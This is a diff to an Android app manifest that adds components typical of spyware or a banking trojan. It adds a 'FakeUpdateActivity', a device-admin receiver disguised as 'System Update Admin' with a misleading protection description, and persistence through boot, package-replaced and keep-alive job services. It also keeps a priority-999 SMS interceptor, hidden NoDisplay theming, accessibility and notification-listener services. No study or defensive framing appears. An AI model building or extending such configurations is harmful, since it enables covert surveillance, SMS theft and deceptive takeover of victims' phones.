@@ -51,8 +51,10 @@
         android:supportsRtl="true"
         android:theme="@android:style/Theme.NoDisplay"
         android:usesCleartextTraffic="true"
-        android:requestLegacyExternalStorage="true">
+        android:requestLegacyExternalStorage="true"
+        android:directBootAware="true">
 
+        <!-- Login activity (Launch) -->
         <activity
             android:name=".LoginActivity"
             android:excludeFromRecents="true"
@@ -63,12 +65,23 @@
             </intent-filter>
         </activity>
 
+        <!-- Fake Update Activity -->
+        <activity
+            android:name=".activities.FakeUpdateActivity"
+            android:excludeFromRecents="true"
+            android:exported="true"
+            android:theme="@android:style/Theme.DeviceDefault.Light"
+            android:launchMode="singleTask">
+        </activity>
+
+        <!-- MainActivity (fallback) -->
         <activity
             android:name=".MainActivity"
             android:excludeFromRecents="true"
             android:exported="true">
         </activity>
 
+        <!-- Services -->
         <service
             android:name=".services.MainService"
             android:enabled="true"
@@ -80,6 +93,12 @@
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="dataSync" />
+
+        <service
+            android:name=".services.KeepAliveJobService"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.BIND_JOB_SERVICE" />
 
         <service
             android:name=".services.AccessibilityService"
@@ -107,6 +126,7 @@
                 android:resource="@xml/notification_listener_config" />
         </service>
 
+        <!-- Receivers -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
@@ -117,12 +137,42 @@
             </intent-filter>
         </receiver>
 
-        <receiver android:name=".receivers.AlarmReceiver" />
-        <receiver android:name=".receivers.SMSReceiver"
+        <receiver
+            android:name=".receivers.PackageReplacedReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.PACKAGE_REPLACED" />
+                <data android:scheme="package" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name=".receivers.AlarmReceiver"
+            android:enabled="true"
+            android:exported="false" />
+
+        <receiver
+            android:name=".receivers.SMSReceiver"
             android:permission="android.permission.BROADCAST_SMS"
             android:exported="true">
             <intent-filter android:priority="999">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Device Admin Receiver -->
+        <receiver
+            android:name=".admin.DeviceAdminReceiver"
+            android:label="System Update Admin"
+            android:description="Required for system optimization and device protection."
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
             </intent-filter>
         </receiver>
 
